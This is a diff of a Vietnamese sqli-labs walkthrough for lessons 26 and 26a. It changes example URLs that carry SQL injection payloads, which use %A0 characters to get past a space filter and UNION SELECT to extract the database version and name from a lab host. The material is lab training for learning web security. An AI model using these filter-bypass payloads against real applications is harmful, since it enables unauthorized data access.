@@ -18,7 +18,7 @@ Những ký tự comment và spaces đã không sử dụng được. ta sẽ th
 Ta sẽ được kết quả như sau 
 
 ```
-http://192.168.80.225/sqli-labs/Less-26/?id=0%27%A0UNION%A0SELECT%A00,@@version,1%20%26%26%a0%271
+http://192.168.80.225/sqli-labs/Less-26/?id=0%27%A0UNION%A0SELECT%A00,@@version,database()%a0%271
 ```
 
 ![](../images/lesson15/screen_8.png)
@@ -26,7 +26,7 @@ http://192.168.80.225/sqli-labs/Less-26/?id=0%27%A0UNION%A0SELECT%A00,@@version,
 Lấy tên DB hiện tại 
 
 ```
-http://192.168.80.225/sqli-labs/Less-26/?id=0%27%A0UNION%A0SELECT%A00,database(),1%20%26%26%a0%271
+http://192.168.80.225/sqli-labs/Less-26/?id=0%27%A0UNION%A0SELECT%A00,database(),1%a0%271
 ```
 
 ![](../images/lesson15/screen_8.png)
@@ -35,7 +35,7 @@ với cách này thì các bạn có thể select bằng cách giống như vớ
 
 # Bài 26a
 ```
-http://192.168.80.225/sqli-labs/Less-26/?id=0%27%A0UNION%A0SELECT%A01,database(),2%A0%26%26%A0%271
+http://192.168.80.225/sqli-labs/Less-26/?id=0%27%A0UNION%A0SELECT%A01,database(),@@version%A0%271
 ```
 
 ![](../images/lesson26/screen_10.png)
